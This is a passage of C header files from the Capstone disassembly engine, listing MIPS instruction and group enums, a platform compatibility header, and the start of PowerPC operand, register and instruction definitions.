	MIPS_INS_ALUIPC,
	MIPS_INS_AND,
	MIPS_INS_ANDI,
	MIPS_INS_APPEND,
	MIPS_INS_ASUB_S,
	MIPS_INS_ASUB_U,
	MIPS_INS_AUI,
	MIPS_INS_AUIPC,
	MIPS_INS_AVER_S,
	MIPS_INS_AVER_U,
	MIPS_INS_AVE_S,
	MIPS_INS_AVE_U,
	MIPS_INS_BADDU,
	MIPS_INS_BAL,
	MIPS_INS_BALC,
	MIPS_INS_BALIGN,
	MIPS_INS_BC,
	MIPS_INS_BC0F,
	MIPS_INS_BC0FL,
	MIPS_INS_BC0T,
	MIPS_INS_BC0TL,
	MIPS_INS_BC1EQZ,
	MIPS_INS_BC1F,
	MIPS_INS_BC1FL,
	MIPS_INS_BC1NEZ,
	MIPS_INS_BC1T,
	MIPS_INS_BC1TL,
	MIPS_INS_BC2EQZ,
	MIPS_INS_BC2F,
	MIPS_INS_BC2FL,
	MIPS_INS_BC2NEZ,
	MIPS_INS_BC2T,
	MIPS_INS_BC2TL,
	MIPS_INS_BC3F,
	MIPS_INS_BC3FL,
	MIPS_INS_BC3T,
	MIPS_INS_BC3TL,
	MIPS_INS_BCLRI,
	MIPS_INS_BCLR,
	MIPS_INS_BEQ,
	MIPS_INS_BEQC,
	MIPS_INS_BEQL,
	MIPS_INS_BEQZALC,
	MIPS_INS_BEQZC,
	MIPS_INS_BGEC,
	MIPS_INS_BGEUC,
	MIPS_INS_BGEZ,
	MIPS_INS_BGEZAL,
	MIPS_INS_BGEZALC,
	MIPS_INS_BGEZALL,
	MIPS_INS_BGEZALS,
	MIPS_INS_BGEZC,
	MIPS_INS_BGEZL,
	MIPS_INS_BGTZ,
	MIPS_INS_BGTZALC,
	MIPS_INS_BGTZC,
	MIPS_INS_BGTZL,
	MIPS_INS_BINSLI,
	MIPS_INS_BINSL,
	MIPS_INS_BINSRI,
	MIPS_INS_BINSR,
	MIPS_INS_BITREV,
	MIPS_INS_BITSWAP,
	MIPS_INS_BLEZ,
	MIPS_INS_BLEZALC,
	MIPS_INS_BLEZC,
	MIPS_INS_BLEZL,
	MIPS_INS_BLTC,
	MIPS_INS_BLTUC,
	MIPS_INS_BLTZ,
	MIPS_INS_BLTZAL,
	MIPS_INS_BLTZALC,
	MIPS_INS_BLTZALL,
	MIPS_INS_BLTZALS,
	MIPS_INS_BLTZC,
	MIPS_INS_BLTZL,
	MIPS_INS_BMNZI,
	MIPS_INS_BMNZ,
	MIPS_INS_BMZI,
	MIPS_INS_BMZ,
	MIPS_INS_BNE,
	MIPS_INS_BNEC,
	MIPS_INS_BNEGI,
	MIPS_INS_BNEG,
	MIPS_INS_BNEL,
	MIPS_INS_BNEZALC,
	MIPS_INS_BNEZC,
	MIPS_INS_BNVC,
	MIPS_INS_BNZ,
	MIPS_INS_BOVC,
	MIPS_INS_BPOSGE32,
	MIPS_INS_BREAK,
	MIPS_INS_BSELI,
	MIPS_INS_BSEL,
	MIPS_INS_BSETI,
	MIPS_INS_BSET,
	MIPS_INS_BZ,
	MIPS_INS_BEQZ,
	MIPS_INS_B,
	MIPS_INS_BNEZ,
	MIPS_INS_BTEQZ,
	MIPS_INS_BTNEZ,
	MIPS_INS_CACHE,
	MIPS_INS_CEIL,
	MIPS_INS_CEQI,
	MIPS_INS_CEQ,
	MIPS_INS_CFC1,
	MIPS_INS_CFCMSA,
	MIPS_INS_CINS,
	MIPS_INS_CINS32,
	MIPS_INS_CLASS,
	MIPS_INS_CLEI_S,
	MIPS_INS_CLEI_U,
	MIPS_INS_CLE_S,
	MIPS_INS_CLE_U,
	MIPS_INS_CLO,
	MIPS_INS_CLTI_S,
	MIPS_INS_CLTI_U,
	MIPS_INS_CLT_S,
	MIPS_INS_CLT_U,
	MIPS_INS_CLZ,
	MIPS_INS_CMPGDU,
	MIPS_INS_CMPGU,
	MIPS_INS_CMPU,
	MIPS_INS_CMP,
	MIPS_INS_COPY_S,
	MIPS_INS_COPY_U,
	MIPS_INS_CTC1,
	MIPS_INS_CTCMSA,
	MIPS_INS_CVT,
	MIPS_INS_C,
	MIPS_INS_CMPI,
	MIPS_INS_DADD,
	MIPS_INS_DADDI,
	MIPS_INS_DADDIU,
	MIPS_INS_DADDU,
	MIPS_INS_DAHI,
	MIPS_INS_DALIGN,
	MIPS_INS_DATI,
	MIPS_INS_DAUI,
	MIPS_INS_DBITSWAP,
	MIPS_INS_DCLO,
	MIPS_INS_DCLZ,
	MIPS_INS_DDIV,
	MIPS_INS_DDIVU,
	MIPS_INS_DERET,
	MIPS_INS_DEXT,
	MIPS_INS_DEXTM,
	MIPS_INS_DEXTU,
	MIPS_INS_DI,
	MIPS_INS_DINS,
	MIPS_INS_DINSM,
	MIPS_INS_DINSU,
	MIPS_INS_DIV,
	MIPS_INS_DIVU,
	MIPS_INS_DIV_S,
	MIPS_INS_DIV_U,
	MIPS_INS_DLSA,
	MIPS_INS_DMFC0,
	MIPS_INS_DMFC1,
	MIPS_INS_DMFC2,
	MIPS_INS_DMOD,
	MIPS_INS_DMODU,
	MIPS_INS_DMTC0,
	MIPS_INS_DMTC1,
	MIPS_INS_DMTC2,
	MIPS_INS_DMUH,
	MIPS_INS_DMUHU,
	MIPS_INS_DMUL,
	MIPS_INS_DMULT,
	MIPS_INS_DMULTU,
	MIPS_INS_DMULU,
	MIPS_INS_DOTP_S,
	MIPS_INS_DOTP_U,
	MIPS_INS_DPADD_S,
	MIPS_INS_DPADD_U,
	MIPS_INS_DPAQX_SA,
	MIPS_INS_DPAQX_S,
	MIPS_INS_DPAQ_SA,
	MIPS_INS_DPAQ_S,
	MIPS_INS_DPAU,
	MIPS_INS_DPAX,
	MIPS_INS_DPA,
	MIPS_INS_DPOP,
	MIPS_INS_DPSQX_SA,
	MIPS_INS_DPSQX_S,
	MIPS_INS_DPSQ_SA,
	MIPS_INS_DPSQ_S,
	MIPS_INS_DPSUB_S,
	MIPS_INS_DPSUB_U,
	MIPS_INS_DPSU,
	MIPS_INS_DPSX,
	MIPS_INS_DPS,
	MIPS_INS_DROTR,
	MIPS_INS_DROTR32,
	MIPS_INS_DROTRV,
	MIPS_INS_DSBH,
	MIPS_INS_DSHD,
	MIPS_INS_DSLL,
	MIPS_INS_DSLL32,
	MIPS_INS_DSLLV,
	MIPS_INS_DSRA,
	MIPS_INS_DSRA32,
	MIPS_INS_DSRAV,
	MIPS_INS_DSRL,
	MIPS_INS_DSRL32,
	MIPS_INS_DSRLV,
	MIPS_INS_DSUB,
	MIPS_INS_DSUBU,
	MIPS_INS_EHB,
	MIPS_INS_EI,
	MIPS_INS_ERET,
	MIPS_INS_EXT,
	MIPS_INS_EXTP,
	MIPS_INS_EXTPDP,
	MIPS_INS_EXTPDPV,
	MIPS_INS_EXTPV,
	MIPS_INS_EXTRV_RS,
	MIPS_INS_EXTRV_R,
	MIPS_INS_EXTRV_S,
	MIPS_INS_EXTRV,
	MIPS_INS_EXTR_RS,
	MIPS_INS_EXTR_R,
	MIPS_INS_EXTR_S,
	MIPS_INS_EXTR,
	MIPS_INS_EXTS,
	MIPS_INS_EXTS32,
	MIPS_INS_ABS,
	MIPS_INS_FADD,
	MIPS_INS_FCAF,
	MIPS_INS_FCEQ,
	MIPS_INS_FCLASS,
	MIPS_INS_FCLE,
	MIPS_INS_FCLT,
	MIPS_INS_FCNE,
	MIPS_INS_FCOR,
	MIPS_INS_FCUEQ,
	MIPS_INS_FCULE,
	MIPS_INS_FCULT,
	MIPS_INS_FCUNE,
	MIPS_INS_FCUN,
	MIPS_INS_FDIV,
	MIPS_INS_FEXDO,
	MIPS_INS_FEXP2,
	MIPS_INS_FEXUPL,
	MIPS_INS_FEXUPR,
	MIPS_INS_FFINT_S,
	MIPS_INS_FFINT_U,
	MIPS_INS_FFQL,
	MIPS_INS_FFQR,
	MIPS_INS_FILL,
	MIPS_INS_FLOG2,
	MIPS_INS_FLOOR,
	MIPS_INS_FMADD,
	MIPS_INS_FMAX_A,
	MIPS_INS_FMAX,
	MIPS_INS_FMIN_A,
	MIPS_INS_FMIN,
	MIPS_INS_MOV,
	MIPS_INS_FMSUB,
	MIPS_INS_FMUL,
	MIPS_INS_MUL,
	MIPS_INS_NEG,
	MIPS_INS_FRCP,
	MIPS_INS_FRINT,
	MIPS_INS_FRSQRT,
	MIPS_INS_FSAF,
	MIPS_INS_FSEQ,
	MIPS_INS_FSLE,
	MIPS_INS_FSLT,
	MIPS_INS_FSNE,
	MIPS_INS_FSOR,
	MIPS_INS_FSQRT,
	MIPS_INS_SQRT,
	MIPS_INS_FSUB,
	MIPS_INS_SUB,
	MIPS_INS_FSUEQ,
	MIPS_INS_FSULE,
	MIPS_INS_FSULT,
	MIPS_INS_FSUNE,
	MIPS_INS_FSUN,
	MIPS_INS_FTINT_S,
	MIPS_INS_FTINT_U,
	MIPS_INS_FTQ,
	MIPS_INS_FTRUNC_S,
	MIPS_INS_FTRUNC_U,
	MIPS_INS_HADD_S,
	MIPS_INS_HADD_U,
	MIPS_INS_HSUB_S,
	MIPS_INS_HSUB_U,
	MIPS_INS_ILVEV,
	MIPS_INS_ILVL,
	MIPS_INS_ILVOD,
	MIPS_INS_ILVR,
	MIPS_INS_INS,
	MIPS_INS_INSERT,
	MIPS_INS_INSV,
	MIPS_INS_INSVE,
	MIPS_INS_J,
	MIPS_INS_JAL,
	MIPS_INS_JALR,
	MIPS_INS_JALRS,
	MIPS_INS_JALS,
	MIPS_INS_JALX,
	MIPS_INS_JIALC,
	MIPS_INS_JIC,
	MIPS_INS_JR,
	MIPS_INS_JRADDIUSP,
	MIPS_INS_JRC,
	MIPS_INS_JALRC,
	MIPS_INS_LB,
	MIPS_INS_LBUX,
	MIPS_INS_LBU,
	MIPS_INS_LD,
	MIPS_INS_LDC1,
	MIPS_INS_LDC2,
	MIPS_INS_LDC3,
	MIPS_INS_LDI,
	MIPS_INS_LDL,
	MIPS_INS_LDPC,
	MIPS_INS_LDR,
	MIPS_INS_LDXC1,
	MIPS_INS_LH,
	MIPS_INS_LHX,
	MIPS_INS_LHU,
	MIPS_INS_LL,
	MIPS_INS_LLD,
	MIPS_INS_LSA,
	MIPS_INS_LUXC1,
	MIPS_INS_LUI,
	MIPS_INS_LW,
	MIPS_INS_LWC1,
	MIPS_INS_LWC2,
	MIPS_INS_LWC3,
	MIPS_INS_LWL,
	MIPS_INS_LWPC,
	MIPS_INS_LWR,
	MIPS_INS_LWUPC,
	MIPS_INS_LWU,
	MIPS_INS_LWX,
	MIPS_INS_LWXC1,
	MIPS_INS_LI,
	MIPS_INS_MADD,
	MIPS_INS_MADDF,
	MIPS_INS_MADDR_Q,
	MIPS_INS_MADDU,
	MIPS_INS_MADDV,
	MIPS_INS_MADD_Q,
	MIPS_INS_MAQ_SA,
	MIPS_INS_MAQ_S,
	MIPS_INS_MAXA,
	MIPS_INS_MAXI_S,
	MIPS_INS_MAXI_U,
	MIPS_INS_MAX_A,
	MIPS_INS_MAX,
	MIPS_INS_MAX_S,
	MIPS_INS_MAX_U,
	MIPS_INS_MFC0,
	MIPS_INS_MFC1,
	MIPS_INS_MFC2,
	MIPS_INS_MFHC1,
	MIPS_INS_MFHI,
	MIPS_INS_MFLO,
	MIPS_INS_MINA,
	MIPS_INS_MINI_S,
	MIPS_INS_MINI_U,
	MIPS_INS_MIN_A,
	MIPS_INS_MIN,
	MIPS_INS_MIN_S,
	MIPS_INS_MIN_U,
	MIPS_INS_MOD,
	MIPS_INS_MODSUB,
	MIPS_INS_MODU,
	MIPS_INS_MOD_S,
	MIPS_INS_MOD_U,
	MIPS_INS_MOVE,
	MIPS_INS_MOVF,
	MIPS_INS_MOVN,
	MIPS_INS_MOVT,
	MIPS_INS_MOVZ,
	MIPS_INS_MSUB,
	MIPS_INS_MSUBF,
	MIPS_INS_MSUBR_Q,
	MIPS_INS_MSUBU,
	MIPS_INS_MSUBV,
	MIPS_INS_MSUB_Q,
	MIPS_INS_MTC0,
	MIPS_INS_MTC1,
	MIPS_INS_MTC2,
	MIPS_INS_MTHC1,
	MIPS_INS_MTHI,
	MIPS_INS_MTHLIP,
	MIPS_INS_MTLO,
	MIPS_INS_MTM0,
	MIPS_INS_MTM1,
	MIPS_INS_MTM2,
	MIPS_INS_MTP0,
	MIPS_INS_MTP1,
	MIPS_INS_MTP2,
	MIPS_INS_MUH,
	MIPS_INS_MUHU,
	MIPS_INS_MULEQ_S,
	MIPS_INS_MULEU_S,
	MIPS_INS_MULQ_RS,
	MIPS_INS_MULQ_S,
	MIPS_INS_MULR_Q,
	MIPS_INS_MULSAQ_S,
	MIPS_INS_MULSA,
	MIPS_INS_MULT,
	MIPS_INS_MULTU,
	MIPS_INS_MULU,
	MIPS_INS_MULV,
	MIPS_INS_MUL_Q,
	MIPS_INS_MUL_S,
	MIPS_INS_NLOC,
	MIPS_INS_NLZC,
	MIPS_INS_NMADD,
	MIPS_INS_NMSUB,
	MIPS_INS_NOR,
	MIPS_INS_NORI,
	MIPS_INS_NOT,
	MIPS_INS_OR,
	MIPS_INS_ORI,
	MIPS_INS_PACKRL,
	MIPS_INS_PAUSE,
	MIPS_INS_PCKEV,
	MIPS_INS_PCKOD,
	MIPS_INS_PCNT,
	MIPS_INS_PICK,
	MIPS_INS_POP,
	MIPS_INS_PRECEQU,
	MIPS_INS_PRECEQ,
	MIPS_INS_PRECEU,
	MIPS_INS_PRECRQU_S,
	MIPS_INS_PRECRQ,
	MIPS_INS_PRECRQ_RS,
	MIPS_INS_PRECR,
	MIPS_INS_PRECR_SRA,
	MIPS_INS_PRECR_SRA_R,
	MIPS_INS_PREF,
	MIPS_INS_PREPEND,
	MIPS_INS_RADDU,
	MIPS_INS_RDDSP,
	MIPS_INS_RDHWR,
	MIPS_INS_REPLV,
	MIPS_INS_REPL,
	MIPS_INS_RINT,
	MIPS_INS_ROTR,
	MIPS_INS_ROTRV,
	MIPS_INS_ROUND,
	MIPS_INS_SAT_S,
	MIPS_INS_SAT_U,
	MIPS_INS_SB,
	MIPS_INS_SC,
	MIPS_INS_SCD,
	MIPS_INS_SD,
	MIPS_INS_SDBBP,
	MIPS_INS_SDC1,
	MIPS_INS_SDC2,
	MIPS_INS_SDC3,
	MIPS_INS_SDL,
	MIPS_INS_SDR,
	MIPS_INS_SDXC1,
	MIPS_INS_SEB,
	MIPS_INS_SEH,
	MIPS_INS_SELEQZ,
	MIPS_INS_SELNEZ,
	MIPS_INS_SEL,
	MIPS_INS_SEQ,
	MIPS_INS_SEQI,
	MIPS_INS_SH,
	MIPS_INS_SHF,
	MIPS_INS_SHILO,
	MIPS_INS_SHILOV,
	MIPS_INS_SHLLV,
	MIPS_INS_SHLLV_S,
	MIPS_INS_SHLL,
	MIPS_INS_SHLL_S,
	MIPS_INS_SHRAV,
	MIPS_INS_SHRAV_R,
	MIPS_INS_SHRA,
	MIPS_INS_SHRA_R,
	MIPS_INS_SHRLV,
	MIPS_INS_SHRL,
	MIPS_INS_SLDI,
	MIPS_INS_SLD,
	MIPS_INS_SLL,
	MIPS_INS_SLLI,
	MIPS_INS_SLLV,
	MIPS_INS_SLT,
	MIPS_INS_SLTI,
	MIPS_INS_SLTIU,
	MIPS_INS_SLTU,
	MIPS_INS_SNE,
	MIPS_INS_SNEI,
	MIPS_INS_SPLATI,
	MIPS_INS_SPLAT,
	MIPS_INS_SRA,
	MIPS_INS_SRAI,
	MIPS_INS_SRARI,
	MIPS_INS_SRAR,
	MIPS_INS_SRAV,
	MIPS_INS_SRL,
	MIPS_INS_SRLI,
	MIPS_INS_SRLRI,
	MIPS_INS_SRLR,
	MIPS_INS_SRLV,
	MIPS_INS_SSNOP,
	MIPS_INS_ST,
	MIPS_INS_SUBQH,
	MIPS_INS_SUBQH_R,
	MIPS_INS_SUBQ,
	MIPS_INS_SUBQ_S,
	MIPS_INS_SUBSUS_U,
	MIPS_INS_SUBSUU_S,
	MIPS_INS_SUBS_S,
	MIPS_INS_SUBS_U,
	MIPS_INS_SUBUH,
	MIPS_INS_SUBUH_R,
	MIPS_INS_SUBU,
	MIPS_INS_SUBU_S,
	MIPS_INS_SUBVI,
	MIPS_INS_SUBV,
	MIPS_INS_SUXC1,
	MIPS_INS_SW,
	MIPS_INS_SWC1,
	MIPS_INS_SWC2,
	MIPS_INS_SWC3,
	MIPS_INS_SWL,
	MIPS_INS_SWR,
	MIPS_INS_SWXC1,
	MIPS_INS_SYNC,
	MIPS_INS_SYSCALL,
	MIPS_INS_TEQ,
	MIPS_INS_TEQI,
	MIPS_INS_TGE,
	MIPS_INS_TGEI,
	MIPS_INS_TGEIU,
	MIPS_INS_TGEU,
	MIPS_INS_TLBP,
	MIPS_INS_TLBR,
	MIPS_INS_TLBWI,
	MIPS_INS_TLBWR,
	MIPS_INS_TLT,
	MIPS_INS_TLTI,
	MIPS_INS_TLTIU,
	MIPS_INS_TLTU,
	MIPS_INS_TNE,
	MIPS_INS_TNEI,
	MIPS_INS_TRUNC,
	MIPS_INS_V3MULU,
	MIPS_INS_VMM0,
	MIPS_INS_VMULU,
	MIPS_INS_VSHF,
	MIPS_INS_WAIT,
	MIPS_INS_WRDSP,
	MIPS_INS_WSBH,
	MIPS_INS_XOR,
	MIPS_INS_XORI,

	//> some alias instructions
	MIPS_INS_NOP,
	MIPS_INS_NEGU,

	//> special instructions
	MIPS_INS_JALR_HB,	// jump and link with Hazard Barrier
	MIPS_INS_JR_HB,		// jump register with Hazard Barrier

	MIPS_INS_ENDING,
} mips_insn;

//> Group of MIPS instructions
typedef enum mips_insn_group {
	MIPS_GRP_INVALID = 0, // = CS_GRP_INVALID

	//> Generic groups
	// all jump instructions (conditional+direct+indirect jumps)
	MIPS_GRP_JUMP,	// = CS_GRP_JUMP

	//> Architecture-specific groups
	MIPS_GRP_BITCOUNT = 128,
	MIPS_GRP_DSP,
	MIPS_GRP_DSPR2,
	MIPS_GRP_FPIDX,
	MIPS_GRP_MSA,
	MIPS_GRP_MIPS32R2,
	MIPS_GRP_MIPS64,
	MIPS_GRP_MIPS64R2,
	MIPS_GRP_SEINREG,
	MIPS_GRP_STDENC,
	MIPS_GRP_SWAP,
	MIPS_GRP_MICROMIPS,
	MIPS_GRP_MIPS16MODE,
	MIPS_GRP_FP64BIT,
	MIPS_GRP_NONANSFPMATH,
	MIPS_GRP_NOTFP64BIT,
	MIPS_GRP_NOTINMICROMIPS,
	MIPS_GRP_NOTNACL,
	MIPS_GRP_NOTMIPS32R6,
	MIPS_GRP_NOTMIPS64R6,
	MIPS_GRP_CNMIPS,
	MIPS_GRP_MIPS32,
	MIPS_GRP_MIPS32R6,
	MIPS_GRP_MIPS64R6,
	MIPS_GRP_MIPS2,
	MIPS_GRP_MIPS3,
	MIPS_GRP_MIPS3_32,
	MIPS_GRP_MIPS3_32R2,
	MIPS_GRP_MIPS4_32,
	MIPS_GRP_MIPS4_32R2,
	MIPS_GRP_MIPS5_32R2,
	MIPS_GRP_GP32BIT,
	MIPS_GRP_GP64BIT,

	MIPS_GRP_ENDING,
} mips_insn_group;

#ifdef __cplusplus
}
#endif

#endif

```

`libs/Capstone/include/platform.h`:

```h
/* Capstone Disassembly Engine */
/* By Axel Souchet & Nguyen Anh Quynh, 2014 */

// handle C99 issue (for pre-2013 VisualStudio)
#ifndef CAPSTONE_PLATFORM_H
#define CAPSTONE_PLATFORM_H

#if !defined(__MINGW32__) && !defined(__MINGW64__) && (defined (WIN32) || defined (WIN64) || defined (_WIN32) || defined (_WIN64))
// MSVC

// stdbool.h
#if (_MSC_VER < 1800)
#ifndef __cplusplus
typedef unsigned char bool;
#define false 0
#define true 1
#endif

#else
// VisualStudio 2013+ -> C99 is supported
#include <stdbool.h>
#endif

#else // not MSVC -> C99 is supported
#include <stdbool.h>
#endif

#endif

```

`libs/Capstone/include/ppc.h`:

```h
#ifndef CAPSTONE_PPC_H
#define CAPSTONE_PPC_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2013-2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include "platform.h"

#ifdef _MSC_VER
#pragma warning(disable:4201)
#endif

//> PPC branch codes for some branch instructions
typedef enum ppc_bc {
	PPC_BC_INVALID  = 0,
	PPC_BC_LT       = (0 << 5) | 12,
	PPC_BC_LE       = (1 << 5) |  4,
	PPC_BC_EQ       = (2 << 5) | 12,
	PPC_BC_GE       = (0 << 5) |  4,
	PPC_BC_GT       = (1 << 5) | 12,
	PPC_BC_NE       = (2 << 5) |  4,
	PPC_BC_UN       = (3 << 5) | 12,
	PPC_BC_NU       = (3 << 5) |  4,

	// extra conditions
	PPC_BC_SO = (4 << 5) | 12,	// summary overflow
	PPC_BC_NS = (4 << 5) | 4,	// not summary overflow
} ppc_bc;

//> PPC branch hint for some branch instructions
typedef enum ppc_bh {
	PPC_BH_INVALID = 0,	// no hint
	PPC_BH_PLUS,	// PLUS hint
	PPC_BH_MINUS,	// MINUS hint
} ppc_bh;

//> Operand type for instruction's operands
typedef enum ppc_op_type {
	PPC_OP_INVALID = 0, // = CS_OP_INVALID (Uninitialized).
	PPC_OP_REG, // = CS_OP_REG (Register operand).
	PPC_OP_IMM, // = CS_OP_IMM (Immediate operand).
	PPC_OP_MEM, // = CS_OP_MEM (Memory operand).
	PPC_OP_CRX = 64,	// Condition Register field
} ppc_op_type;

// Instruction's operand referring to memory
// This is associated with PPC_OP_MEM operand type above
typedef struct ppc_op_mem {
	unsigned int base;	// base register
	int32_t disp;	// displacement/offset value
} ppc_op_mem;

typedef struct ppc_op_crx {
	unsigned int scale;
	unsigned int reg;
	ppc_bc cond;
} ppc_op_crx;

// Instruction operand
typedef struct cs_ppc_op {
	ppc_op_type type;	// operand type
	union {
		unsigned int reg;	// register value for REG operand
		int32_t imm;		// immediate value for IMM operand
		ppc_op_mem mem;		// base/disp value for MEM operand
		ppc_op_crx crx;		// operand with condition register
	};
} cs_ppc_op;

// Instruction structure
typedef struct cs_ppc {
	// branch code for branch instructions
	ppc_bc bc;

	// branch hint for branch instructions
	ppc_bh bh;

	// if update_cr0 = True, then this 'dot' insn updates CR0
	bool update_cr0;

	// Number of operands of this instruction, 
	// or 0 when instruction has no operand.
	uint8_t op_count;
	cs_ppc_op operands[8]; // operands for this instruction.
} cs_ppc;

//> PPC registers
typedef enum ppc_reg {
	PPC_REG_INVALID = 0,

	PPC_REG_CARRY,
	PPC_REG_CC,
	PPC_REG_CR0,
	PPC_REG_CR1,
	PPC_REG_CR2,
	PPC_REG_CR3,
	PPC_REG_CR4,
	PPC_REG_CR5,
	PPC_REG_CR6,
	PPC_REG_CR7,
	PPC_REG_CTR,
	PPC_REG_F0,
	PPC_REG_F1,
	PPC_REG_F2,
	PPC_REG_F3,
	PPC_REG_F4,
	PPC_REG_F5,
	PPC_REG_F6,
	PPC_REG_F7,
	PPC_REG_F8,
	PPC_REG_F9,
	PPC_REG_F10,
	PPC_REG_F11,
	PPC_REG_F12,
	PPC_REG_F13,
	PPC_REG_F14,
	PPC_REG_F15,
	PPC_REG_F16,
	PPC_REG_F17,
	PPC_REG_F18,
	PPC_REG_F19,
	PPC_REG_F20,
	PPC_REG_F21,
	PPC_REG_F22,
	PPC_REG_F23,
	PPC_REG_F24,
	PPC_REG_F25,
	PPC_REG_F26,
	PPC_REG_F27,
	PPC_REG_F28,
	PPC_REG_F29,
	PPC_REG_F30,
	PPC_REG_F31,
	PPC_REG_LR,
	PPC_REG_R0,
	PPC_REG_R1,
	PPC_REG_R2,
	PPC_REG_R3,
	PPC_REG_R4,
	PPC_REG_R5,
	PPC_REG_R6,
	PPC_REG_R7,
	PPC_REG_R8,
	PPC_REG_R9,
	PPC_REG_R10,
	PPC_REG_R11,
	PPC_REG_R12,
	PPC_REG_R13,
	PPC_REG_R14,
	PPC_REG_R15,
	PPC_REG_R16,
	PPC_REG_R17,
	PPC_REG_R18,
	PPC_REG_R19,
	PPC_REG_R20,
	PPC_REG_R21,
	PPC_REG_R22,
	PPC_REG_R23,
	PPC_REG_R24,
	PPC_REG_R25,
	PPC_REG_R26,
	PPC_REG_R27,
	PPC_REG_R28,
	PPC_REG_R29,
	PPC_REG_R30,
	PPC_REG_R31,
	PPC_REG_V0,
	PPC_REG_V1,
	PPC_REG_V2,
	PPC_REG_V3,
	PPC_REG_V4,
	PPC_REG_V5,
	PPC_REG_V6,
	PPC_REG_V7,
	PPC_REG_V8,
	PPC_REG_V9,
	PPC_REG_V10,
	PPC_REG_V11,
	PPC_REG_V12,
	PPC_REG_V13,
	PPC_REG_V14,
	PPC_REG_V15,
	PPC_REG_V16,
	PPC_REG_V17,
	PPC_REG_V18,
	PPC_REG_V19,
	PPC_REG_V20,
	PPC_REG_V21,
	PPC_REG_V22,
	PPC_REG_V23,
	PPC_REG_V24,
	PPC_REG_V25,
	PPC_REG_V26,
	PPC_REG_V27,
	PPC_REG_V28,
	PPC_REG_V29,
	PPC_REG_V30,
	PPC_REG_V31,
	PPC_REG_VRSAVE,
	PPC_REG_VS0,
	PPC_REG_VS1,
	PPC_REG_VS2,
	PPC_REG_VS3,
	PPC_REG_VS4,
	PPC_REG_VS5,
	PPC_REG_VS6,
	PPC_REG_VS7,
	PPC_REG_VS8,
	PPC_REG_VS9,
	PPC_REG_VS10,
	PPC_REG_VS11,
	PPC_REG_VS12,
	PPC_REG_VS13,
	PPC_REG_VS14,
	PPC_REG_VS15,
	PPC_REG_VS16,
	PPC_REG_VS17,
	PPC_REG_VS18,
	PPC_REG_VS19,
	PPC_REG_VS20,
	PPC_REG_VS21,
	PPC_REG_VS22,
	PPC_REG_VS23,
	PPC_REG_VS24,
	PPC_REG_VS25,
	PPC_REG_VS26,
	PPC_REG_VS27,
	PPC_REG_VS28,
	PPC_REG_VS29,
	PPC_REG_VS30,
	PPC_REG_VS31,
	PPC_REG_VS32,
	PPC_REG_VS33,
	PPC_REG_VS34,
	PPC_REG_VS35,
	PPC_REG_VS36,
	PPC_REG_VS37,
	PPC_REG_VS38,
	PPC_REG_VS39,
	PPC_REG_VS40,
	PPC_REG_VS41,
	PPC_REG_VS42,
	PPC_REG_VS43,
	PPC_REG_VS44,
	PPC_REG_VS45,
	PPC_REG_VS46,
	PPC_REG_VS47,
	PPC_REG_VS48,
	PPC_REG_VS49,
	PPC_REG_VS50,
	PPC_REG_VS51,
	PPC_REG_VS52,
	PPC_REG_VS53,
	PPC_REG_VS54,
	PPC_REG_VS55,
	PPC_REG_VS56,
	PPC_REG_VS57,
	PPC_REG_VS58,
	PPC_REG_VS59,
	PPC_REG_VS60,
	PPC_REG_VS61,
	PPC_REG_VS62,
	PPC_REG_VS63,

	// extra registers for PPCMapping.c
	PPC_REG_RM,
	PPC_REG_CTR8,
	PPC_REG_LR8,
	PPC_REG_CR1EQ,

	PPC_REG_ENDING,   // <-- mark the end of the list of registers
} ppc_reg;

//> PPC instruction
typedef enum ppc_insn {
	PPC_INS_INVALID = 0,

	PPC_INS_ADD,
	PPC_INS_ADDC,
	PPC_INS_ADDE,
	PPC_INS_ADDI,
	PPC_INS_ADDIC,
	PPC_INS_ADDIS,
	PPC_INS_ADDME,
	PPC_INS_ADDZE,
	PPC_INS_AND,
	PPC_INS_ANDC,
	PPC_INS_ANDIS,
	PPC_INS_ANDI,
	PPC_INS_B,
	PPC_INS_BA,
	PPC_INS_BC,
	PPC_INS_BCCTR,
	PPC_INS_BCCTRL,
	PPC_INS_BCL,
	PPC_INS_BCLR,
	PPC_INS_BCLRL,
	PPC_INS_BCTR,
	PPC_INS_BCTRL,
	PPC_INS_BDNZ,
	PPC_INS_BDNZA,
	PPC_INS_BDNZL,
	PPC_INS_BDNZLA,
	PPC_INS_BDNZLR,
	PPC_INS_BDNZLRL,
	PPC_INS_BDZ,
	PPC_INS_BDZA,
	PPC_INS_BDZL,
	PPC_INS_BDZLA,
	PPC_INS_BDZLR,
	PPC_INS_BDZLRL,
	PPC_INS_BL,
	PPC_INS_BLA,
	PPC_INS_BLR,
	PPC_INS_BLRL,
	PPC_INS_BRINC,
	PPC_INS_CMPD,
	PPC_INS_CMPDI,
	PPC_INS_CMPLD,
	PPC_INS_CMPLDI,
	PPC_INS_CMPLW,
	PPC_INS_CMPLWI,
	PPC_INS_CMPW,
	PPC_INS_CMPWI,
	PPC_INS_CNTLZD,
	PPC_INS_CNTLZW,
	PPC_INS_CREQV,
	PPC_INS_CRXOR,
	PPC_INS_CRAND,
	PPC_INS_CRANDC,
	PPC_INS_CRNAND,
	PPC_INS_CRNOR,
	PPC_INS_CROR,
	PPC_INS_CRORC,
	PPC_INS_DCBA,
	PPC_INS_DCBF,
	PPC_INS_DCBI,
	PPC_INS_DCBST,
	PPC_INS_DCBT,
	PPC_INS_DCBTST,
	PPC_INS_DCBZ,
	PPC_INS_DCBZL,
	PPC_INS_DCCCI,
	PPC_INS_DIVD,
	PPC_INS_DIVDU,
	PPC_INS_DIVW,
	PPC_INS_DIVWU,
	PPC_INS_DSS,
	PPC_INS_DSSALL,
	PPC_INS_DST,
	PPC_INS_DSTST,
	PPC_INS_DSTSTT,
	PPC_INS_DSTT,
	PPC_INS_EIEIO,
	PPC_INS_EQV,
	PPC_INS_EVABS,
	PPC_INS_EVADDIW,
	PPC_INS_EVADDSMIAAW,
	PPC_INS_EVADDSSIAAW,
	PPC_INS_EVADDUMIAAW,
	PPC_INS_EVADDUSIAAW,
	PPC_INS_EVADDW,
	PPC_INS_EVAND,
	PPC_INS_EVANDC,
	PPC_INS_EVCMPEQ,
	PPC_INS_EVCMPGTS,
	PPC_INS_EVCMPGTU,
	PPC_INS_EVCMPLTS,
	PPC_INS_EVCMPLTU,
	PPC_INS_EVCNTLSW,
	PPC_INS_EVCNTLZW,
	PPC_INS_EVDIVWS,
	PPC_INS_EVDIVWU,
